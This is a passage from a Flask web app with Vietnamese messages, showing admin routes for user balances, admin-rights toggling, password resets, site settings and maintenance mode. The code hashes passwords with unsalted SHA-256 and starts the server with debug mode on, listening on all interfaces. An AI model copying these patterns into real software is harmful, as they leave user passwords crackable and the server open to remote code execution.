            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT id, username, balance, is_admin, created_at FROM users ORDER BY id DESC"
            ).fetchall()

    return render_template(
        "admin_users.html",
        users=rows,
        q=q,
        notice=request.args.get("notice")
    )


@app.route("/admin/users/<int:target_user_id>/balance", methods=["POST"])
@login_required
@admin_required
def admin_adjust_balance(target_user_id):
    action = request.form.get("action")
    q = request.form.get("q", "")
    try:
        amount = int(request.form.get("amount", 0))
    except Exception:
        amount = 0

    if amount <= 0:
        return redirect(url_for("admin_users", q=q, notice="Số tiền không hợp lệ"))

    with get_db() as conn:
        user = conn.execute(
            "SELECT id, balance FROM users WHERE id = ?", (target_user_id,)
        ).fetchone()
        if not user:
            return redirect(url_for("admin_users", q=q, notice="Không tìm thấy người dùng"))

        if action == "subtract":
            new_balance = max(0, (user["balance"] or 0) - amount)
            conn.execute(
                "UPDATE users SET balance = ? WHERE id = ?",
                (new_balance, target_user_id)
            )
            notice = f"Đã trừ {amount:,} VND của user #{target_user_id}"
        else:
            conn.execute(
                "UPDATE users SET balance = COALESCE(balance, 0) + ? WHERE id = ?",
                (amount, target_user_id)
            )
            notice = f"Đã cộng {amount:,} VND cho user #{target_user_id}"

    return redirect(url_for("admin_users", q=q, notice=notice))


@app.route("/admin/users/<int:target_user_id>/toggle_admin", methods=["POST"])
@login_required
@admin_required
def admin_toggle_admin(target_user_id):
    q = request.form.get("q", "")

    if target_user_id == session.get("user_id"):
        return redirect(
            url_for("admin_users", q=q, notice="Không thể tự hủy quyền admin của chính mình")
        )

    with get_db() as conn:
        user = conn.execute(
            "SELECT id, username, is_admin FROM users WHERE id = ?",
            (target_user_id,)
        ).fetchone()
        if not user:
            return redirect(url_for("admin_users", q=q, notice="Không tìm thấy người dùng"))

        new_status = 0 if user["is_admin"] else 1
        conn.execute(
            "UPDATE users SET is_admin = ? WHERE id = ?",
            (new_status, target_user_id)
        )

        notice = (
            f"Đã cấp quyền admin cho {user['username']}"
            if new_status
            else f"Đã hủy quyền admin của {user['username']}"
        )

    return redirect(url_for("admin_users", q=q, notice=notice))


# ==================================================================
#               ADMIN — RESET PASSWORD (MỚI THÊM)
# ==================================================================
@app.route("/admin/users/<int:target_user_id>/reset_password", methods=["POST"])
@login_required
@admin_required
def admin_reset_password(target_user_id):
    """
    Đặt lại mật khẩu cho user chỉ định. Chỉ admin mới gọi được.
    Mật khẩu mới sẽ được hash SHA-256 và cập nhật ngay.
    """
    new_password = request.form.get("new_password", "").strip()

    if len(new_password) < 6:
        return redirect(url_for(
            "admin_users",
            notice="Mật khẩu mới phải có ít nhất 6 ký tự"
        ))

    new_hash = hashlib.sha256(new_password.encode()).hexdigest()

    with get_db() as conn:
        user = conn.execute(
            "SELECT id, username FROM users WHERE id = ?", (target_user_id,)
        ).fetchone()
        if not user:
            return redirect(url_for("admin_users", notice="Không tìm thấy người dùng"))

        conn.execute(
            "UPDATE users SET password_hash = ? WHERE id = ?",
            (new_hash, target_user_id)
        )

    print(f"[ADMIN] Reset password cho user #{target_user_id} ({user['username']})")

    return redirect(url_for(
        "admin_users",
        notice=f"Đã reset mật khẩu cho {user['username']}"
    ))


# ==================================================================
#                    ADMIN — SETTINGS
# ==================================================================
@app.route("/admin/settings", methods=["GET", "POST"])
@login_required
@admin_required
def admin_settings():
    error = None

    if request.method == "POST":
        zalo_phone = request.form.get("zalo_phone", "").strip()
        telegram_link = request.form.get("telegram_link", "").strip()
        price_per_skin_raw = request.form.get("price_per_skin", "").strip()

        if zalo_phone:
            set_site_setting("zalo_phone", zalo_phone)
        if telegram_link:
            set_site_setting("telegram_link", telegram_link)

        if price_per_skin_raw:
            try:
                price_val = int(price_per_skin_raw)
                if price_val < 1:
                    error = "Giá phải lớn hơn 0"
                else:
                    set_site_setting("price_per_skin", str(price_val))
            except ValueError:
                error = "Giá không hợp lệ, chỉ được nhập số"

        if error:
            settings = get_site_settings()
            return render_template(
                "admin_settings.html", settings=settings, error=error
            )

        return redirect(url_for("admin_settings", saved=1))

    settings = get_site_settings()
    return render_template(
        "admin_settings.html",
        settings=settings,
        saved=request.args.get("saved")
    )


@app.route("/admin/maintenance/toggle", methods=["POST"])
@login_required
@admin_required
def admin_toggle_maintenance():
    settings = get_site_settings()
    current = settings.get("maintenance_mode", "0")
    new_value = "0" if current == "1" else "1"
    set_site_setting("maintenance_mode", new_value)
    return redirect(url_for("admin_settings"))


# ==================================================================
#                            MAIN
# ==================================================================
if __name__ == "__main__":
    threading.Thread(target=bot.start_bot, daemon=True).start()
    print("✅ Bot đang chạy ngầm")
    app.run(host="0.0.0.0", port=80, debug=True)
